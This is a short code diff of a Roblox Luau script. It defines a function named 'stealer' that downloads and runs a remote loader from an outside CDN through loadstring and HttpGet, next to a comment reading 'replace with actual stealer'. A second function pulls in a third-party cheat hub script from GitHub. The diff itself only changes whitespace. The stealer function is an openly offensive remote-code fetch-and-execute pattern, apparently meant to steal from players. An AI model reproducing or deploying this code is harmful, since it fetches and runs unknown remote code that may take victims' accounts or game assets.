@@ -1,7 +1,7 @@
 local function stealer()
 
-ID="9d92573c-e052-4670-ae74-88b74c396c29";
-loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()```    -- replace with actual stealer
+ ID="9d92573c-e052-4670-ae74-88b74c396c29";
+loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()```   -- replace with actual stealer
 end
 local function loadui()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
